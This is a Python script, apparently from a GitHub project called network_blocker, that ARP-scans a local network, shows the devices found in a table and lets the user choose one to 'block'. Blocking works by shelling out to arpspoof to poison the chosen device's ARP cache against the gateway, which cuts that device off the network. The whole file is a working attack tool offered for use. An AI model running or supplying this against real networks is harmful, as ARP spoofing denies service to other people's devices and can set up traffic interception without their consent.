#
# Developed by @FakuVenturi: https://github.com/fakuventuri
#
# Github: https://github.com/fakuventuri/network_blocker
#
# Path: network_blocker.py
#
# This script is used to block a device on your network.
#
# Usage:
#   sudo python3 network_blocker.py
#
import os
import sys
import socket

from typing import List, Tuple

try:
    from scapy.all import ARP, Ether, srp
    from tabulate import tabulate
except ImportError:
    print("Required dependencies not found.")
    print("Please install the required packages with the following command:")
    print("pip install scapy tabulate")
    sys.exit(1)


def scan_network(ip_range: str) -> List[Tuple[str, str, str]]:
    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(arp_req, timeout=3, verbose=False)

    device_list = []

    for _, rcv in answered:
        ip = rcv[ARP].psrc
        mac = rcv[Ether].src
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            hostname = "Unknown"
        device_list.append((ip, mac, hostname))

    return device_list


def generate_devices_table(device_list: List[Tuple[str, str, str]]):
    headers = ["Index", "IP Address", "MAC Address", "Hostname"]
    table = [
        (index, ip, mac, hostname)
        for index, (ip, mac, hostname) in enumerate(device_list)
    ]

    return tabulate(table, headers=headers, tablefmt="grid")


def block_device(
    device: Tuple[str, str, str],
    gateway_ip: str,
    iface: str,
):
    target_ip, target_mac, hostname = device

    # send the arp spoofing packets
    arpspoof_cmd = f"sudo arpspoof -i {iface} -t {target_ip} {gateway_ip}"
    os.system(arpspoof_cmd)


def print_menu():
    os.system("clear")  # clear the terminal

    print("\n#                Welcome to Network Blocker              #")
    print("         Script to block a device on your network          \n")
    print("                                  Developed by FakuVenturi \n")


if __name__ == "__main__":
    print_menu()

    if os.geteuid() != 0:
        print("Please run this script with root privileges.")
        sys.exit(1)

    print("Scanning network...")

    iface = (
        os.popen("ip -o -4 route show to default | awk '{print $5}'").read().strip("\n")
    )  # get the interface name and remove the trailing newline

    ip_range = "192.168.1.0/24"  # the ip range to scan

    gateway_ip = (
        os.popen("ip -o -4 route show to default | awk '{print $3}'").read().strip("\n")
    )  # get the gateway ip and remove the trailing newline

    # get the local ip address
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    IPAddr = s.getsockname()[0]
    s.close()

    # scan the network and get the list of devices
    device_list = scan_network(ip_range)

    if not device_list:
        print("No devices found.")
        sys.exit(1)

    # generate the table of devices
    devices_table = generate_devices_table(device_list)

    print_menu()

    print(devices_table, "\n")

    print("           Your IP Address is: ", IPAddr, "\n\n\n")

    # loop to get the user's choice
    while True:
        try:
            # get the user's choice
            choice = int(input("Enter the index of the device or -1 to exit: "))

            if choice == -1:
                print("\nExiting...")
                break
            elif 0 <= choice < len(device_list):
                # check if the user selected the gateway and prevent it
                if device_list[choice][0] == gateway_ip:
                    print_menu()

                    print(devices_table, "\n")

                    print("           Your IP Address is: ", IPAddr, "\n")

                    print("             You cannot block your gateway.\n")
                    continue

                print("\nselected device: ", choice)
                selected_device = device_list[choice]
                print(
                    "Blocking",
                    selected_device[0],
                )
                print("Press Ctrl+C and wait to stop blocking the device.\n")

                block_device(selected_device, gateway_ip, iface)

                print_menu()

                print(devices_table, "\n")

                print("           Your IP Address is: ", IPAddr, "\n")
            else:
                print_menu()

                print(devices_table, "\n")

                print("           Your IP Address is: ", IPAddr, "\n")

                print("           Invalid choice. Please try again.\n")
        except ValueError:
            print_menu()

            print(devices_table, "\n")

            print("           Your IP Address is: ", IPAddr, "\n")

            print("          Invalid input. Please enter a number.    \n")
        except KeyboardInterrupt:
            print("\nExiting...")
            break
